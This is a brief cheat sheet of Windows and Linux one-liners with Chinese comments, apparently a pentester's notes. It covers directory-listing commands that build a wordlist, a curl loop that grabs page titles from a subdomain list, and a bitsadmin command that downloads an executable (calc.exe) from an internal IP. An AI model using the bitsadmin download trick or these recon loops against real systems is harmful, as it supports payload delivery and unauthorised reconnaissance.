		for /R "d:\xldown" %s in (.) do echo %s >> dir.dict	#win遍历目录
		dir /s/b d:\xldown					#win遍历目录带搜索功能
		find ./ -type f 					#linux 遍历文件
		
		for i in $(cat subdomains.dict);do echo $i && curl -s $i|iconv -t utf8|grep -o "<title.*</title>";done		获取title
		bitsadmin /rawreturn /transfer getfiles http://192.168.1.1/calc.exe c:\calc.exe								下载文件
